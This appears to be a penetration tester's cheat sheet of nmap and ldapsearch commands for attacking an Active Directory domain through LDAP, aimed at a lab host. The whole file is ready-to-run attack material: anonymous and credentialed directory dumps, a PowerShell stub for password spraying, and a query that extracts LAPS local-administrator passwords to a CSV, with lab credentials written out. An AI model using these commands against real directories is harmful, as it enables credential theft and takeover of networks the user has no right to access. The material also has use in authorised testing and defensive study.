# Examples of using Nmap ldap script to enumerate domain as long as we have one valid user/pass
# This is using the admin account, so we can extract LAPS passwords and other sensitive information


# Try NMAP
# If you have no creds, just line of sight on an LDAP server you can try this to get the information you need for ruther attacks:
nmap -n -p 389 -sV --script "ldap* and not brute" 192.168.0.83

# Try ldapsearch
# If you don't/can't use nmap, this worked for me
ldapsearch -H ldap://192.168.0.83:389/ -x -s base -b '' "(objectClass=*)" "*" + 

# Trying null/anon and then standard user
# Standard user will return quite a bit
ldapsearch -x -H ldap://192.168.0.83 -D '' -w '' -b "DC=mellosec,DC=sunn"
ldapsearch -x -H ldap://192.168.0.83 -D 'mellosec\fwelch' -w 'getnaked46' -b "DC=mellosec,DC=sunn"

# See if we can make a function to do it
# Maybe a small list fof users and a list of passwords, would need to build timing options in though
function spray-ldap {
    param(
        [Parameter(Mandatory=$true)][string]$domain,
        [Parameter(Mandatory=$true)][string]$user,
        [Parameter(Mandatory=$true)][string]$pass,
        [Parameter(Mandatory=$true)][string]$server,
        [Parameter(Mandatory=$true)][string]$tld
    )
    ldapsearch -x -H ldap://$server -D "$domain\$user" -w "$pass" -b "DC=$domain,DC=$tld"
}

# Get All Computers
# Can change 'computers' to 'all' 'ad_dcs' 'users' 'computers' and 'custom'
# By default will return 20 results, set ldap.maxobjects -1 to get rid of the limit
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=computers' \
192.168.0.83

# all, no limit
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=all,ldap.maxobjects="-1"' 192.168.0.83

# Get all users and return the 'Name' attribute
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=users,ldap.maxobjects="-1",ldap.attrib="name"' 192.168.0.83

# Computers and OS
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=computers, \
ldap.attrib=operatingSystem' \
192.168.0.83


# Admin - Computers with details, saved to CSV
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=computers, \
ldap.attrib={name,dNSHostName}, \
ldap.savesearch=test' 192.168.0.83

# # Low Priv
# nmap -p 389 --script ldap-search \
# --script-args \
# 'ldap.username="CN=fwelch,CN=Users,DC=mellosec,DC=sunn", \
# ldap.password="getnaked46", \
# ldap.qfilter=computers, \
# ldap.attrib={name,dNSHostName}, \
# ldap.savesearch=test' 192.168.0.83



# Extract LAPS passwords and save in CSV
nmap -p 389 --script ldap-search \
--script-args \
'ldap.username="CN=Administrator,CN=Users,DC=mellosec,DC=sunn", \
ldap.password="Password123", \
ldap.qfilter=computers, \
ldap.attrib=ms-Mcs-AdmPwd, \
ldap.savesearch=LAPS' \ 192.168.0.83
